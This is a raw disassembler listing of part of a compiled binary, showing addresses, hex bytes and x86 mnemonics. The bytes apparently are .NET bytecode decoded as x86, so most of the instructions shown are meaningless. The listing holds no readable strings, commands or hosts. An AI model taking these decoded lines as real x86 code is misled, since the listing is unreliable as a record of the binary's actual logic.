  4025d1:	00 00                	add    %al,(%eax)
  4025d3:	11 28                	adc    %ebp,(%eax)
  4025d5:	4a                   	dec    %edx
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 0a                	or     (%edx),%cl
  4025da:	de 14 25 28 2c 00 00 	ficoms 0x2c28(,%eiz,1)
  4025e1:	0a 0b                	or     (%ebx),%cl
  4025e3:	72 71                	jb     0x402656
  4025e5:	01 00                	add    %eax,(%eax)
  4025e7:	70 0a                	jo     0x4025f3
  4025e9:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4025ef:	00 06                	add    %al,(%esi)
  4025f1:	2a 00                	sub    (%eax),%al
  4025f3:	00 01                	add    %al,(%ecx)
  4025f5:	10 00                	adc    %al,(%eax)
  4025f7:	00 00                	add    %al,(%eax)
  4025f9:	00 00                	add    %al,(%eax)
  4025fb:	00 08                	add    %cl,(%eax)
  4025fd:	08 00                	or     %al,(%eax)
  4025ff:	14 14                	adc    $0x14,%al
  402601:	00 00                	add    %al,(%eax)
  402603:	01 1b                	add    %ebx,(%ebx)
  402605:	30 03                	xor    %al,(%ebx)
  402607:	00 82 00 00 00 02    	add    %al,0x2000000(%edx)
  40260d:	00 00                	add    %al,(%eax)
  40260f:	11 28                	adc    %ebp,(%eax)
  402611:	04 00                	add    $0x0,%al
  402613:	00 06                	add    %al,(%esi)
  402615:	6f                   	outsl  %ds:(%esi),(%dx)
  402616:	4b                   	dec    %ebx
  402617:	00 00                	add    %al,(%eax)
  402619:	0a 6f 4c             	or     0x4c(%edi),%ch
  40261c:	00 00                	add    %al,(%eax)
  40261e:	0a 72 7d             	or     0x7d(%edx),%dh
  402621:	01 00                	add    %eax,(%eax)
  402623:	70 72                	jo     0x402697
  402625:	7f 00                	jg     0x402627
  402627:	00 70 6f             	add    %dh,0x6f(%eax)
  40262a:	4d                   	dec    %ebp
  40262b:	00 00                	add    %al,(%eax)
  40262d:	0a 72 91             	or     -0x6f(%edx),%dh
  402630:	01 00                	add    %eax,(%eax)
  402632:	70 72                	jo     0x4026a6
  402634:	a1 01 00 70 6f       	mov    0x6f700001,%eax
  402639:	4d                   	dec    %ebp
  40263a:	00 00                	add    %al,(%eax)
  40263c:	0a 72 a9             	or     -0x57(%edx),%dh
  40263f:	01 00                	add    %eax,(%eax)
  402641:	70 72                	jo     0x4026b5
  402643:	7f 00                	jg     0x402645
  402645:	00 70 6f             	add    %dh,0x6f(%eax)
  402648:	4d                   	dec    %ebp
  402649:	00 00                	add    %al,(%eax)
  40264b:	0a 72 ad             	or     -0x53(%edx),%dh
  40264e:	01 00                	add    %eax,(%eax)
  402650:	70 72                	jo     0x4026c4
  402652:	7f 00                	jg     0x402654
  402654:	00 70 6f             	add    %dh,0x6f(%eax)
  402657:	4d                   	dec    %ebp
  402658:	00 00                	add    %al,(%eax)
  40265a:	0a 72 b1             	or     -0x4f(%edx),%dh
  40265d:	01 00                	add    %eax,(%eax)
  40265f:	70 72                	jo     0x4026d3
  402661:	b7 01                	mov    $0x1,%bh
  402663:	00 70 6f             	add    %dh,0x6f(%eax)
  402666:	4d                   	dec    %ebp
  402667:	00 00                	add    %al,(%eax)
  402669:	0a 72 bb             	or     -0x45(%edx),%dh
  40266c:	01 00                	add    %eax,(%eax)
  40266e:	70 72                	jo     0x4026e2
  402670:	a1 01 00 70 6f       	mov    0x6f700001,%eax
  402675:	4d                   	dec    %ebp
  402676:	00 00                	add    %al,(%eax)
  402678:	0a 0a                	or     (%edx),%cl
  40267a:	de 14 25 28 2c 00 00 	ficoms 0x2c28(,%eiz,1)
  402681:	0a 0b                	or     (%ebx),%cl
  402683:	72 c5                	jb     0x40264a
  402685:	01 00                	add    %eax,(%eax)
  402687:	70 0a                	jo     0x402693
  402689:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40268f:	00 06                	add    %al,(%esi)
  402691:	2a 00                	sub    (%eax),%al
  402693:	00 01                	add    %al,(%ecx)
  402695:	10 00                	adc    %al,(%eax)
  402697:	00 00                	add    %al,(%eax)
  402699:	00 00                	add    %al,(%eax)
  40269b:	00 6c 6c 00          	add    %ch,0x0(%esp,%ebp,2)
  40269f:	14 14                	adc    $0x14,%al
  4026a1:	00 00                	add    %al,(%eax)
  4026a3:	01 1b                	add    %ebx,(%ebx)
  4026a5:	30 02                	xor    %al,(%edx)
  4026a7:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	02 00                	add    (%eax),%al
  4026ae:	00 11                	add    %dl,(%ecx)
  4026b0:	72 d3                	jb     0x402685
  4026b2:	01 00                	add    %eax,(%eax)
  4026b4:	70 28                	jo     0x4026de
  4026b6:	25 00 00 0a 72       	and    $0x720a0000,%eax
  4026bb:	01 02                	add    %eax,(%edx)
  4026bd:	00 70 6f             	add    %dh,0x6f(%eax)
  4026c0:	22 00                	and    (%eax),%al
  4026c2:	00 0a                	add    %cl,(%edx)
  4026c4:	2c 08                	sub    $0x8,%al
  4026c6:	72 07                	jb     0x4026cf
  4026c8:	02 00                	add    (%eax),%al
  4026ca:	70 0a                	jo     0x4026d6
  4026cc:	de 1c 72             	ficomps (%edx,%esi,2)
  4026cf:	0f 02 00             	lar    (%eax),%eax
  4026d2:	70 0a                	jo     0x4026de
  4026d4:	de 14 25 28 2c 00 00 	ficoms 0x2c28(,%eiz,1)
  4026db:	0a 0b                	or     (%ebx),%cl
  4026dd:	72 17                	jb     0x4026f6
  4026df:	02 00                	add    (%eax),%al
  4026e1:	70 0a                	jo     0x4026ed
  4026e3:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4026e9:	00 06                	add    %al,(%esi)
  4026eb:	2a 01                	sub    (%ecx),%al
  4026ed:	10 00                	adc    %al,(%eax)
  4026ef:	00 00                	add    %al,(%eax)
  4026f1:	00 00                	add    %al,(%eax)
  4026f3:	00 26                	add    %ah,(%esi)
  4026f5:	26 00 14 14          	add    %dl,%es:(%esp,%edx,1)
  4026f9:	00 00                	add    %al,(%eax)
  4026fb:	01 1b                	add    %ebx,(%ebx)
  4026fd:	30 02                	xor    %al,(%edx)
  4026ff:	00 35 00 00 00 06    	add    %dh,0x6000000
  402705:	00 00                	add    %al,(%eax)
  402707:	11 28                	adc    %ebp,(%eax)
  402709:	28 00                	sub    %al,(%eax)
  40270b:	00 0a                	add    %cl,(%edx)
  40270d:	73 4e                	jae    0x40275d
  40270f:	00 00                	add    %al,(%eax)
  402711:	0a 6f 4f             	or     0x4f(%edi),%ch
  402714:	00 00                	add    %al,(%eax)
  402716:	0a 0b                	or     (%ebx),%cl
  402718:	12 01                	adc    (%ecx),%al
  40271a:	72 1b                	jb     0x402737
  40271c:	02 00                	add    (%eax),%al
  40271e:	70 28                	jo     0x402748
  402720:	50                   	push   %eax
  402721:	00 00                	add    %al,(%eax)
  402723:	0a 0a                	or     (%edx),%cl
  402725:	de 14 25 28 2c 00 00 	ficoms 0x2c28(,%eiz,1)
  40272c:	0a 0c 72             	or     (%edx,%esi,2),%cl
  40272f:	71 01                	jno    0x402732
  402731:	00 70 0a             	add    %dh,0xa(%eax)
  402734:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40273a:	00 06                	add    %al,(%esi)
  40273c:	2a 00                	sub    (%eax),%al
  40273e:	00 00                	add    %al,(%eax)
  402740:	01 10                	add    %edx,(%eax)
  402742:	00 00                	add    %al,(%eax)
  402744:	00 00                	add    %al,(%eax)
  402746:	00 00                	add    %al,(%eax)
  402748:	1f                   	pop    %ds
  402749:	1f                   	pop    %ds
  40274a:	00 14 14             	add    %dl,(%esp,%edx,1)
  40274d:	00 00                	add    %al,(%eax)
  40274f:	01 1b                	add    %ebx,(%ebx)
  402751:	30 04 00             	xor    %al,(%eax,%eax,1)
  402754:	78 00                	js     0x402756
  402756:	00 00                	add    %al,(%eax)
  402758:	03 00                	add    (%eax),%eax
  40275a:	00 11                	add    %dl,(%ecx)
  40275c:	72 2f                	jb     0x40278d
  40275e:	02 00                	add    (%eax),%al
  402760:	70 72                	jo     0x4027d4
  402762:	4f                   	dec    %edi
  402763:	02 00                	add    (%eax),%al
  402765:	70 28                	jo     0x40278f
  402767:	26 00 00             	add    %al,%es:(%eax)
  40276a:	06                   	push   %es
  40276b:	72 67                	jb     0x4027d4
  40276d:	02 00                	add    (%eax),%al
  40276f:	70 72                	jo     0x4027e3
  402771:	6b 02 00             	imul   $0x0,(%edx),%eax
  402774:	70 72                	jo     0x4027e8
  402776:	81 02 00 70 28 26    	addl   $0x26287000,(%edx)
  40277c:	00 00                	add    %al,(%eax)
  40277e:	06                   	push   %es
  40277f:	28 51 00             	sub    %dl,0x0(%ecx)
  402782:	00 0a                	add    %cl,(%edx)
  402784:	72 67                	jb     0x4027ed
  402786:	02 00                	add    (%eax),%al
  402788:	70 72                	jo     0x4027fc
  40278a:	9b                   	fwait
  40278b:	02 00                	add    (%eax),%al
  40278d:	70 72                	jo     0x402801
  40278f:	81 02 00 70 28 26    	addl   $0x26287000,(%edx)
  402795:	00 00                	add    %al,(%eax)
  402797:	06                   	push   %es
  402798:	28 51 00             	sub    %dl,0x0(%ecx)
  40279b:	00 0a                	add    %cl,(%edx)
  40279d:	72 67                	jb     0x402806
  40279f:	02 00                	add    (%eax),%al
  4027a1:	70 72                	jo     0x402815
  4027a3:	bb 02 00 70 72       	mov    $0x72700002,%ebx
  4027a8:	e7 02                	out    %eax,$0x2
  4027aa:	00 70 28             	add    %dh,0x28(%eax)
  4027ad:	26 00 00             	add    %al,%es:(%eax)
  4027b0:	06                   	push   %es
  4027b1:	28 51 00             	sub    %dl,0x0(%ecx)
  4027b4:	00 0a                	add    %cl,(%edx)
  4027b6:	28 27                	sub    %ah,(%edi)
  4027b8:	00 00                	add    %al,(%eax)
  4027ba:	06                   	push   %es
  4027bb:	0a de                	or     %dh,%bl
  4027bd:	14 25                	adc    $0x25,%al
  4027bf:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4027c2:	00 0a                	add    %cl,(%edx)
  4027c4:	0b 72 71             	or     0x71(%edx),%esi
  4027c7:	01 00                	add    %eax,(%eax)
  4027c9:	70 0a                	jo     0x4027d5
  4027cb:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4027d1:	00 06                	add    %al,(%esi)
  4027d3:	2a 01                	sub    (%ecx),%al
  4027d5:	10 00                	adc    %al,(%eax)
  4027d7:	00 00                	add    %al,(%eax)
  4027d9:	00 00                	add    %al,(%eax)
  4027db:	00 62 62             	add    %ah,0x62(%edx)
  4027de:	00 14 14             	add    %dl,(%esp,%edx,1)
  4027e1:	00 00                	add    %al,(%eax)
  4027e3:	01 1b                	add    %ebx,(%ebx)
  4027e5:	30 03                	xor    %al,(%ebx)
  4027e7:	00 81 00 00 00 07    	add    %al,0x7000000(%ecx)
  4027ed:	00 00                	add    %al,(%eax)
  4027ef:	11 72 7f             	adc    %esi,0x7f(%edx)
  4027f2:	00 00                	add    %al,(%eax)
  4027f4:	70 0b                	jo     0x402801
  4027f6:	02 73 52             	add    0x52(%ebx),%dh
  4027f9:	00 00                	add    %al,(%eax)
  4027fb:	0a 6f 53             	or     0x53(%edi),%ch
  4027fe:	00 00                	add    %al,(%eax)
  402800:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402803:	6f                   	outsl  %ds:(%esi),(%dx)
  402804:	54                   	push   %esp
  402805:	00 00                	add    %al,(%eax)
  402807:	0a 0d 2b 37 09 6f    	or     0x6f09372b,%cl
  40280d:	55                   	push   %ebp
  40280e:	00 00                	add    %al,(%eax)
  402810:	0a 74 38 00          	or     0x0(%eax,%edi,1),%dh
  402814:	00 01                	add    %al,(%ecx)
  402816:	13 04 07             	adc    (%edi,%eax,1),%eax
  402819:	72 7f                	jb     0x40289a
  40281b:	00 00                	add    %al,(%eax)
  40281d:	70 16                	jo     0x402835
  40281f:	28 56 00             	sub    %dl,0x0(%esi)
  402822:	00 0a                	add    %cl,(%edx)
  402824:	2d 1c 11 04 03       	sub    $0x304111c,%eax
  402829:	6f                   	outsl  %ds:(%esi),(%dx)
  40282a:	57                   	push   %edi
  40282b:	00 00                	add    %al,(%eax)
  40282d:	0a 6f 15             	or     0x15(%edi),%ch
  402830:	00 00                	add    %al,(%eax)
  402832:	0a 0b                	or     (%ebx),%cl
  402834:	de 14 28             	ficoms (%eax,%ebp,1)
  402837:	2c 00                	sub    $0x0,%al
  402839:	00 0a                	add    %cl,(%edx)
  40283b:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  402841:	00 09                	add    %cl,(%ecx)
  402843:	6f                   	outsl  %ds:(%esi),(%dx)
  402844:	58                   	pop    %eax
  402845:	00 00                	add    %al,(%eax)
  402847:	0a 2d c1 de 0a 09    	or     0x90adec1,%ch
  40284d:	2c 06                	sub    $0x6,%al
  40284f:	09 6f 44             	or     %ebp,0x44(%edi)
  402852:	00 00                	add    %al,(%eax)
  402854:	0a dc                	or     %ah,%bl
  402856:	07                   	pop    %es
  402857:	0a de                	or     %dh,%bl
  402859:	15 25 28 2c 00       	adc    $0x2c2825,%eax
  40285e:	00 0a                	add    %cl,(%edx)
  402860:	13 05 72 71 01 00    	adc    0x17172,%eax
  402866:	70 0a                	jo     0x402872
  402868:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40286e:	00 06                	add    %al,(%esi)
  402870:	2a 00                	sub    (%eax),%al
  402872:	00 00                	add    %al,(%eax)
  402874:	01 28                	add    %ebp,(%eax)
  402876:	00 00                	add    %al,(%eax)
  402878:	00 00                	add    %al,(%eax)
  40287a:	36 00 10             	add    %dl,%ss:(%eax)
  40287d:	46                   	inc    %esi
  40287e:	00 0c 14             	add    %cl,(%esp,%edx,1)
  402881:	00 00                	add    %al,(%eax)
  402883:	01 02                	add    %eax,(%edx)
  402885:	00 12                	add    %dl,(%edx)
  402887:	00 4a 5c             	add    %cl,0x5c(%edx)
  40288a:	00 0a                	add    %cl,(%edx)
	...
  402894:	6a 6a                	push   $0x6a
  402896:	00 15 14 00 00 01    	add    %dl,0x1000014
  40289c:	1b 30                	sbb    (%eax),%esi
  40289e:	03 00                	add    (%eax),%eax
  4028a0:	71 00                	jno    0x4028a2
  4028a2:	00 00                	add    %al,(%eax)
  4028a4:	08 00                	or     %al,(%eax)
  4028a6:	00 11                	add    %dl,(%ecx)
  4028a8:	73 59                	jae    0x402903
  4028aa:	00 00                	add    %al,(%eax)
  4028ac:	0a 28                	or     (%eax),%ch
  4028ae:	2e 00 00             	add    %al,%cs:(%eax)
  4028b1:	0a 02                	or     (%edx),%al
  4028b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4028b4:	2f                   	das
  4028b5:	00 00                	add    %al,(%eax)
  4028b7:	0a 6f 5a             	or     0x5a(%edi),%ch
  4028ba:	00 00                	add    %al,(%eax)
  4028bc:	0a 0b                	or     (%ebx),%cl
  4028be:	73 5b                	jae    0x40291b
  4028c0:	00 00                	add    %al,(%eax)
  4028c2:	0a 0c 07             	or     (%edi,%eax,1),%cl
  4028c5:	8e 69 17             	mov    0x17(%ecx),%gs
  4028c8:	da 0d 1f 0a 13 04    	fimull 0x4130a1f
  4028ce:	2b 1f                	sub    (%edi),%ebx
  4028d0:	08 07                	or     %al,(%edi)
  4028d2:	11 04 8f             	adc    %eax,(%edi,%ecx,4)
  4028d5:	2d 00 00 01 72       	sub    $0x72010000,%eax
  4028da:	f1                   	int1
  4028db:	02 00                	add    (%eax),%al
  4028dd:	70 28                	jo     0x402907
  4028df:	5c                   	pop    %esp
  4028e0:	00 00                	add    %al,(%eax)
  4028e2:	0a 6f 5d             	or     0x5d(%edi),%ch
  4028e5:	00 00                	add    %al,(%eax)
  4028e7:	0a 26                	or     (%esi),%ah
  4028e9:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4028ec:	d6                   	salc
  4028ed:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4028f0:	04 09                	add    $0x9,%al
  4028f2:	31 dc                	xor    %ebx,%esp
  4028f4:	08 6f 5e             	or     %ch,0x5e(%edi)
  4028f7:	00 00                	add    %al,(%eax)
  4028f9:	0a 6f 5f             	or     0x5f(%edi),%ch
  4028fc:	00 00                	add    %al,(%eax)
  4028fe:	0a 0a                	or     (%edx),%cl
  402900:	de 15 25 28 2c 00    	ficoms 0x2c2825
  402906:	00 0a                	add    %cl,(%edx)
  402908:	13 05 72 71 01 00    	adc    0x17172,%eax
  40290e:	70 0a                	jo     0x40291a
  402910:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  402916:	00 06                	add    %al,(%esi)
  402918:	2a 00                	sub    (%eax),%al
  40291a:	00 00                	add    %al,(%eax)
  40291c:	01 10                	add    %edx,(%eax)
  40291e:	00 00                	add    %al,(%eax)
  402920:	00 00                	add    %al,(%eax)
  402922:	00 00                	add    %al,(%eax)
  402924:	5a                   	pop    %edx
  402925:	5a                   	pop    %edx
  402926:	00 15 14 00 00 01    	add    %dl,0x1000014
  40292c:	1b 30                	sbb    (%eax),%esi
  40292e:	03 00                	add    (%eax),%eax
  402930:	4e                   	dec    %esi
  402931:	00 00                	add    %al,(%eax)
  402933:	00 02                	add    %al,(%edx)
  402935:	00 00                	add    %al,(%eax)
  402937:	11 72 f7             	adc    %esi,-0x9(%edx)
  40293a:	02 00                	add    (%eax),%al
  40293c:	70 28                	jo     0x402966
  40293e:	17                   	pop    %ss
  40293f:	00 00                	add    %al,(%eax)
  402941:	06                   	push   %es
  402942:	14 16                	adc    $0x16,%al
  402944:	28 56 00             	sub    %dl,0x0(%esi)
  402947:	00 0a                	add    %cl,(%edx)
  402949:	2d 18 72 f7 02       	sub    $0x2f77218,%eax
  40294e:	00 70 72             	add    %dh,0x72(%eax)
  402951:	0f 03 00             	lsl    (%eax),%eax
  402954:	70 28                	jo     0x40297e
  402956:	18 00                	sbb    %al,(%eax)
  402958:	00 06                	add    %al,(%esi)
  40295a:	26 72 0f             	es jb  0x40296c
  40295d:	03 00                	add    (%eax),%eax
  40295f:	70 0a                	jo     0x40296b
  402961:	de 21                	fisubs (%ecx)
  402963:	72 f7                	jb     0x40295c
  402965:	02 00                	add    (%eax),%al
  402967:	70 28                	jo     0x402991
  402969:	17                   	pop    %ss
  40296a:	00 00                	add    %al,(%eax)
  40296c:	06                   	push   %es
  40296d:	0a de                	or     %dh,%bl
  40296f:	14 25                	adc    $0x25,%al
  402971:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402974:	00 0a                	add    %cl,(%edx)
  402976:	0b 72 71             	or     0x71(%edx),%esi
  402979:	01 00                	add    %eax,(%eax)
  40297b:	70 0a                	jo     0x402987
  40297d:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  402983:	00 06                	add    %al,(%esi)
  402985:	2a 00                	sub    (%eax),%al
  402987:	00 01                	add    %al,(%ecx)
  402989:	10 00                	adc    %al,(%eax)
  40298b:	00 00                	add    %al,(%eax)
  40298d:	00 00                	add    %al,(%eax)
  40298f:	00 38                	add    %bh,(%eax)
  402991:	38 00                	cmp    %al,(%eax)
  402993:	14 14                	adc    $0x14,%al
  402995:	00 00                	add    %al,(%eax)
  402997:	01 1b                	add    %ebx,(%ebx)
  402999:	30 03                	xor    %al,(%ebx)
  40299b:	00 76 00             	add    %dh,0x0(%esi)
  40299e:	00 00                	add    %al,(%eax)
  4029a0:	02 00                	add    (%eax),%al
  4029a2:	00 11                	add    %dl,(%ecx)
  4029a4:	7e 10                	jle    0x4029b6
  4029a6:	00 00                	add    %al,(%eax)
  4029a8:	04 2c                	add    $0x2c,%al
  4029aa:	51                   	push   %ecx
  4029ab:	72 2b                	jb     0x4029d8
  4029ad:	03 00                	add    (%eax),%eax
  4029af:	70 28                	jo     0x4029d9
  4029b1:	17                   	pop    %ss
  4029b2:	00 00                	add    %al,(%eax)
  4029b4:	06                   	push   %es
  4029b5:	14 16                	adc    $0x16,%al
  4029b7:	28 56 00             	sub    %dl,0x0(%esi)
  4029ba:	00 0a                	add    %cl,(%edx)
  4029bc:	2d 1d 72 2b 03       	sub    $0x32b721d,%eax
  4029c1:	00 70 72             	add    %dh,0x72(%eax)
  4029c4:	33 03                	xor    (%ebx),%eax
  4029c6:	00 70 28             	add    %dh,0x28(%eax)
  4029c9:	18 00                	sbb    %al,(%eax)
  4029cb:	00 06                	add    %al,(%esi)
  4029cd:	26 72 2b             	es jb  0x4029fb
  4029d0:	03 00                	add    (%eax),%eax
  4029d2:	70 28                	jo     0x4029fc
  4029d4:	17                   	pop    %ss
  4029d5:	00 00                	add    %al,(%eax)
  4029d7:	06                   	push   %es
  4029d8:	0a de                	or     %dh,%bl
  4029da:	3d 72 2b 03 00       	cmp    $0x32b72,%eax
  4029df:	70 28                	jo     0x402a09
  4029e1:	17                   	pop    %ss
  4029e2:	00 00                	add    %al,(%eax)
  4029e4:	06                   	push   %es
  4029e5:	0a de                	or     %dh,%bl
  4029e7:	30 25 28 2c 00 00    	xor    %ah,0x2c28
  4029ed:	0a 0b                	or     (%ebx),%cl
  4029ef:	72 71                	jb     0x402a62
  4029f1:	01 00                	add    %eax,(%eax)
  4029f3:	70 0a                	jo     0x4029ff
  4029f5:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4029fb:	1c 7e                	sbb    $0x7e,%al
  4029fd:	10 00                	adc    %al,(%eax)
  4029ff:	00 04 2d 0f 7e 11 00 	add    %al,0x117e0f(,%ebp,1)
  402a06:	00 04 2d 08 72 47 03 	add    %al,0x3477208(,%ebp,1)
  402a0d:	00 70 0a             	add    %dh,0xa(%eax)
  402a10:	2b 06                	sub    (%esi),%eax
  402a12:	72 33                	jb     0x402a47
  402a14:	03 00                	add    (%eax),%eax
  402a16:	70 0a                	jo     0x402a22
  402a18:	06                   	push   %es
  402a19:	2a 00                	sub    (%eax),%al
  402a1b:	00 01                	add    %al,(%ecx)
  402a1d:	10 00                	adc    %al,(%eax)
  402a1f:	00 00                	add    %al,(%eax)
  402a21:	00 07                	add    %al,(%edi)
  402a23:	00 3d 44 00 14 14    	add    %bh,0x14140044
  402a29:	00 00                	add    %al,(%eax)
  402a2b:	01 1b                	add    %ebx,(%ebx)
  402a2d:	30 03                	xor    %al,(%ebx)
  402a2f:	00 98 00 00 00 09    	add    %bl,0x9000000(%eax)
  402a35:	00 00                	add    %al,(%eax)
  402a37:	11 14 0b             	adc    %edx,(%ebx,%ecx,1)
  402a3a:	72 59                	jb     0x402a95
  402a3c:	03 00                	add    (%eax),%eax
  402a3e:	70 28                	jo     0x402a68
  402a40:	60                   	pusha
  402a41:	00 00                	add    %al,(%eax)
  402a43:	0a 72 5f             	or     0x5f(%edx),%dh
  402a46:	03 00                	add    (%eax),%eax
  402a48:	70 28                	jo     0x402a72
  402a4a:	51                   	push   %ecx
  402a4b:	00 00                	add    %al,(%eax)
  402a4d:	0a 72 8b             	or     -0x75(%edx),%dh
  402a50:	03 00                	add    (%eax),%eax
  402a52:	70 73                	jo     0x402ac7
  402a54:	61                   	popa
  402a55:	00 00                	add    %al,(%eax)
  402a57:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402a5a:	6f                   	outsl  %ds:(%esi),(%dx)
  402a5b:	62 00                	bound  %eax,(%eax)
  402a5d:	00 0a                	add    %cl,(%edx)
  402a5f:	0d 09 6f 54 00       	or     $0x546f09,%eax
  402a64:	00 0a                	add    %cl,(%edx)
  402a66:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  402a69:	1c 11                	sbb    $0x11,%al
  402a6b:	04 6f                	add    $0x6f,%al
  402a6d:	55                   	push   %ebp
  402a6e:	00 00                	add    %al,(%eax)
  402a70:	0a 74 38 00          	or     0x0(%eax,%edi,1),%dh
  402a74:	00 01                	add    %al,(%ecx)
  402a76:	72 c9                	jb     0x402a41
  402a78:	03 00                	add    (%eax),%eax
  402a7a:	70 6f                	jo     0x402aeb
  402a7c:	57                   	push   %edi
  402a7d:	00 00                	add    %al,(%eax)
  402a7f:	0a 6f 15             	or     0x15(%edi),%ch
  402a82:	00 00                	add    %al,(%eax)
  402a84:	0a 0b                	or     (%ebx),%cl
  402a86:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402a89:	58                   	pop    %eax
  402a8a:	00 00                	add    %al,(%eax)
  402a8c:	0a 2d db de 0c 11    	or     0x110cdedb,%ch
  402a92:	04 2c                	add    $0x2c,%al
  402a94:	07                   	pop    %es
  402a95:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402a98:	44                   	inc    %esp
  402a99:	00 00                	add    %al,(%eax)
  402a9b:	0a dc                	or     %ah,%bl
  402a9d:	07                   	pop    %es
  402a9e:	7e 63                	jle    0x402b03
  402aa0:	00 00                	add    %al,(%eax)
  402aa2:	0a 16                	or     (%esi),%dl
  402aa4:	28 56 00             	sub    %dl,0x0(%esi)
  402aa7:	00 0a                	add    %cl,(%edx)
  402aa9:	2d 06 72 e1 03       	sub    $0x3e17206,%eax
  402aae:	00 70 0b             	add    %dh,0xb(%eax)
  402ab1:	07                   	pop    %es
  402ab2:	6f                   	outsl  %ds:(%esi),(%dx)
  402ab3:	64 00 00             	add    %al,%fs:(%eax)
  402ab6:	0a 0b                	or     (%ebx),%cl
  402ab8:	07                   	pop    %es
  402ab9:	0a de                	or     %dh,%bl
  402abb:	12 28                	adc    (%eax),%ch
  402abd:	2c 00                	sub    $0x0,%al
  402abf:	00 0a                	add    %cl,(%edx)
  402ac1:	72 e1                	jb     0x402aa4
  402ac3:	03 00                	add    (%eax),%eax
  402ac5:	70 0a                	jo     0x402ad1
  402ac7:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  402acd:	00 06                	add    %al,(%esi)
  402acf:	2a 01                	sub    (%ecx),%al
  402ad1:	1c 00                	sbb    $0x0,%al
  402ad3:	00 02                	add    %al,(%edx)
  402ad5:	00 28                	add    %ch,(%eax)
  402ad7:	00 31                	add    %dh,(%ecx)
  402ad9:	59                   	pop    %ecx
  402ada:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402add:	00 00                	add    %al,(%eax)
  402adf:	00 00                	add    %al,(%eax)
  402ae1:	00 00                	add    %al,(%eax)
  402ae3:	00 84 84 00 12 14 00 	add    %al,0x141200(%esp,%eax,4)
  402aea:	00 01                	add    %al,(%ecx)
  402aec:	1b 30                	sbb    (%eax),%esi
  402aee:	02 00                	add    (%eax),%al
  402af0:	32 00                	xor    (%eax),%al
  402af2:	00 00                	add    %al,(%eax)
  402af4:	0a 00                	or     (%eax),%al
  402af6:	00 11                	add    %dl,(%ecx)
  402af8:	28 65 00             	sub    %ah,0x0(%ebp)
  402afb:	00 0a                	add    %cl,(%edx)
  402afd:	0b 07                	or     (%edi),%eax
  402aff:	73 66                	jae    0x402b67
  402b01:	00 00                	add    %al,(%eax)
  402b03:	0a 20                	or     (%eax),%ah
  402b05:	20 02                	and    %al,(%edx)
  402b07:	00 00                	add    %al,(%eax)
  402b09:	6f                   	outsl  %ds:(%esi),(%dx)
  402b0a:	67 00 00             	add    %al,(%bx,%si)
  402b0d:	0a 2c 04             	or     (%esp,%eax,1),%ch
  402b10:	17                   	pop    %ss
  402b11:	0a de                	or     %dh,%bl
  402b13:	14 16                	adc    $0x16,%al
  402b15:	0a de                	or     %dh,%bl
  402b17:	10 25 28 2c 00 00    	adc    %ah,0x2c28
  402b1d:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402b20:	0a 28                	or     (%eax),%ch
  402b22:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  402b27:	00 06                	add    %al,(%esi)
  402b29:	2a 00                	sub    (%eax),%al
  402b2b:	00 01                	add    %al,(%ecx)
  402b2d:	10 00                	adc    %al,(%eax)
  402b2f:	00 00                	add    %al,(%eax)
  402b31:	00 00                	add    %al,(%eax)
  402b33:	00 20                	add    %ah,(%eax)
  402b35:	20 00                	and    %al,(%eax)
  402b37:	10 14 00             	adc    %dl,(%eax,%eax,1)
  402b3a:	00 01                	add    %al,(%ecx)
  402b3c:	1b 30                	sbb    (%eax),%esi
  402b3e:	02 00                	add    (%eax),%al
  402b40:	a0 00 00 00 0b       	mov    0xb000000,%al
  402b45:	00 00                	add    %al,(%eax)
  402b47:	11 72 e9             	adc    %esi,-0x17(%edx)
  402b4a:	03 00                	add    (%eax),%eax
  402b4c:	70 28                	jo     0x402b76
  402b4e:	68 00 00 0a 8e       	push   $0x8e0a0000
  402b53:	69 16 31 78 72 f7    	imul   $0xf7727831,(%esi),%edx
  402b59:	03 00                	add    (%eax),%eax
  402b5b:	70 72                	jo     0x402bcf
  402b5d:	65 04 00             	gs add $0x0,%al
  402b60:	70 28                	jo     0x402b8a
  402b62:	69 00 00 0a 0b 07    	imul   $0x70b0a00,(%eax),%eax
  402b68:	73 6a                	jae    0x402bd4
  402b6a:	00 00                	add    %al,(%eax)
  402b6c:	0a 6f 62             	or     0x62(%edi),%ch
  402b6f:	00 00                	add    %al,(%eax)
  402b71:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402b74:	6f                   	outsl  %ds:(%esi),(%dx)
  402b75:	54                   	push   %esp
  402b76:	00 00                	add    %al,(%eax)
  402b78:	0a 0d 2b 2e 09 6f    	or     0x6f092e2b,%cl
  402b7e:	55                   	push   %ebp
  402b7f:	00 00                	add    %al,(%eax)
  402b81:	0a 74 38 00          	or     0x0(%eax,%edi,1),%dh
  402b85:	00 01                	add    %al,(%ecx)
  402b87:	72 7b                	jb     0x402c04
  402b89:	04 00                	add    $0x0,%al
  402b8b:	70 6f                	jo     0x402bfc
  402b8d:	57                   	push   %edi
  402b8e:	00 00                	add    %al,(%eax)
  402b90:	0a 6f 15             	or     0x15(%edi),%ch
  402b93:	00 00                	add    %al,(%eax)
  402b95:	0a 72 93             	or     -0x6d(%edx),%dh
